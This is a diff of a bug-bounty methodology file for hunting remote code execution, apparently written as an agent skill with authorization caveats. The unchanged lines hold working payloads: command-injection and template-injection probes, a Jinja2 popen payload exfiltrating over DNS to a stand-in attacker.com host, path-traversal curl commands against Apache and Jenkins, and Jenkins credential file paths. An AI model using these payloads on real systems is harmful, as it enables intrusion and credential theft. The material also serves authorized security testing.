@@ -34,7 +34,7 @@ report_count: 87  # imported metadata; not independently verified
 
 **Content-type is the #1 silent failure mode for command injection.**
 
-Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, potentially returning a plausible 200 response. You get a false negative with no indication anything went wrong.
+Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing; the app executes normally with no injection, potentially returning a plausible 200 response. You get a false negative with no indication anything went wrong.
 
 **Rule:** Capture the legitimate request and preserve its actual encoding, method and CSRF/auth context. URL names and response JSON do not establish the accepted request content type.
 
@@ -47,7 +47,7 @@ value$(id)      ← subshell
 value`id`       ← backtick
 ```
 
-**Candidate evidence:** Unexpected OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, use a unique non-sensitive marker and a control request to rule out reflection, static text or a scanner intermediary.
+**Candidate evidence:** Unexpected OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped; that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, use a unique non-sensitive marker and a control request to rule out reflection, static text or a scanner intermediary.
 
 ---
 
@@ -58,15 +58,15 @@ Imported payout, report-count and historical case assertions are not verified gu
 RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:
 
 **Highest-paying asset types:**
-- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
-- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
-- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
-- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
-- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload
+- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab); privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
+- **Supply chain / package registries**; dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
+- **Cloud-native infrastructure**; exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
+- **Mobile app backends and OAuth flows**; where server-side processing of attacker-controlled data meets execution contexts
+- **Admin/management consoles**; template injection in configuration panels reaches root with a single payload
 
 **Why this class pays most:**
 - Blast radius is infrastructure-wide, not user-scoped
-- Proof-of-concept is unambiguous — shell output is undeniable
+- Proof-of-concept is unambiguous; shell output is undeniable
 - Fix requires architectural changes, not just a patch
 - Programs cannot afford false negatives on RCE
 
@@ -89,12 +89,12 @@ RCE vulnerabilities command the highest payouts in bug bounty programs because t
 
 ### Response Headers / Tech Stack Signals
 ```
-X-Powered-By: Express          # Node.js — npm dependency surface
+X-Powered-By: Express          # Node.js; npm dependency surface
 X-Powered-By: Phusion Passenger
-Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
+Server: nginx (ingress-nginx)  # Kubernetes ingress; path field injection
 X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
-Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
-X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
+Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych); deserialization
+X-GitHub-Enterprise-Version    # GHAS; nomad template, collectd, syslog-ng injection
 ```
 
 ### JavaScript / Frontend Signals
@@ -123,7 +123,7 @@ window.location = userControlled  // URL scheme bypass → JS execution
 
 1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.
 
-2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.
+2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege; the GHES cluster produced 6 separate RCEs from one console role.
 
 3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.
 
@@ -132,7 +132,7 @@ window.location = userControlled  // URL scheme bypass → JS execution
    - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
    - REXML: do not use resource-exhaustion XML on live systems; use a bounded lab reproduction
 
-5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — do not register target package names or publish install hooks without explicit supply-chain testing authorization. Prefer an isolated registry/build reproduction.
+5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos; do not register target package names or publish install hooks without explicit supply-chain testing authorization. Prefer an isolated registry/build reproduction.
 
 6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: use an agreed disposable canary path; do not write cron entries or persistence. Execution testing requires a separately authorized controlled plan.
 
@@ -150,7 +150,7 @@ window.location = userControlled  // URL scheme bypass → JS execution
 
 ### Template Injection Probes
 ```
-# Generic polyglot — works across Jinja2, Twig, Freemarker, Pebble, Velocity
+# Generic polyglot: works across Jinja2, Twig, Freemarker, Pebble, Velocity
 {{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
 {{'7'*7}}
 {{config}}
@@ -179,7 +179,7 @@ curl -sI http://target/ | grep -i "Server:"
 **File-read test (any alias):**
 ```bash
 curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
-# Note: --path-as-is is REQUIRED — curl normalizes %2e by default
+# Note: --path-as-is is REQUIRED: curl normalizes %2e by default
 ```
 
 **RCE test (cgi-enabled alias only):**
@@ -189,7 +189,7 @@ curl --path-as-is -X POST \
   "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
 ```
 
-**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity — not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.
+**Triage discipline note:** when the same path-traversal primitive works on multiple aliases but only one is CGI-enabled, the **maximum** impact is the severity; not the average. A "file read" finding on `/icons/` should always be escalated by re-probing `/cgi-bin/` (and any other alias visible from `<Directory>` blocks in the server-info disclosure or response patterns). See `triage-validation` Pre-Severity Gate.
 
 ### Spring Cloud Function SpEL injection (CVE-2022-22963)
 
@@ -258,7 +258,7 @@ webshell and persistence payloads are excluded from the default workflow.
 
 ### Args4j `@`-prefix file expansion (Jenkins CVE-2024-23897 family)
 
-Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back — turning argument echoing into an arbitrary file-read primitive. Jenkins 2.441/LTS 2.426.2 and earlier are affected; fixed in 2.442/LTS 2.426.3/2.440.1. Overall/Read permits full-file reads; without it only limited lines may be exposed, depending on available commands. Do not assume anonymous permissions.
+Java CLIs built on the `args4j` library default to `expandAtFiles=true`, which expands `@filename` arguments by reading the file and treating each line as a separate command argument. When such a CLI is exposed over HTTP (Jenkins CLI is the canonical case), the server-side error message echoes failed arguments back; turning argument echoing into an arbitrary file-read primitive. Jenkins 2.441/LTS 2.426.2 and earlier are affected; fixed in 2.442/LTS 2.426.3/2.440.1. Overall/Read permits full-file reads; without it only limited lines may be exposed, depending on available commands. Do not assume anonymous permissions.
 
 **Detection:**
 - Target exposes `/cli` and `/jnlpJars/jenkins-cli.jar` (Jenkins family)
@@ -281,11 +281,11 @@ java -jar jenkins-cli.jar -s http://target:8080/ -http connect-node @/etc/passwd
 ```
 
 **Sensitive paths for defensive exposure review only (do not retrieve in routine validation):**
-- `/var/jenkins_home/secret.key` — master encryption key for stored credentials
-- `/var/jenkins_home/secrets/master.key` — derives the encryption key
-- `/var/jenkins_home/credentials.xml` — credential store (encrypted with secret.key — pair with offline decrypt tools)
-- `/var/jenkins_home/users/*/config.xml` — per-user API tokens (often unencrypted)
-- `/var/jenkins_home/jobs/*/config.xml` — pipeline configs that may inline AWS keys, SSH keys, registry tokens
+- `/var/jenkins_home/secret.key`; master encryption key for stored credentials
+- `/var/jenkins_home/secrets/master.key`; derives the encryption key
+- `/var/jenkins_home/credentials.xml`; credential store (encrypted with secret.key; pair with offline decrypt tools)
+- `/var/jenkins_home/users/*/config.xml`; per-user API tokens (often unencrypted)
+- `/var/jenkins_home/jobs/*/config.xml`; pipeline configs that may inline AWS keys, SSH keys, registry tokens
 
 **Pattern generalizes beyond Jenkins.** Any Java service that:
 1. Embeds args4j (most enterprise Java CLIs since 2010s)
@@ -331,7 +331,7 @@ Filenames accepted from user input are used in filesystem operations without nor
 The GHES management console granted "Editor" roles access to configuration fields that touched shell execution. Developers assumed privilege boundaries existed at a higher architectural level.
 
 **7. Missing input validation on infrastructure-facing fields**
-Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings — but the downstream processor (nginx config generator, regex engine) interprets them as code.
+Ingress/nginx annotation values, Kubernetes spec fields, and webhook URLs are treated as opaque strings; but the downstream processor (nginx config generator, regex engine) interprets them as code.
 
 ---
 
@@ -392,7 +392,7 @@ data:text/html,<script>alert(1)</script>
 ```
 # If {{ }} is sanitized on output but not evaluation:
 {% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}
-# Blind — use DNS callback instead of output
+# Blind: use DNS callback instead of output
 {{ lipsum.__globals__.os.popen('nslookup $(id).attacker.com').read() }}
 ```
 
@@ -418,7 +418,7 @@ Object.const_get(:Kernel).system("id")
 ## When to Use
 
 - You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
-- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.
+- You need the recon, exploitation, or validation workflow described below; executed strictly inside the approved scope.
 
 ## Limitations
 
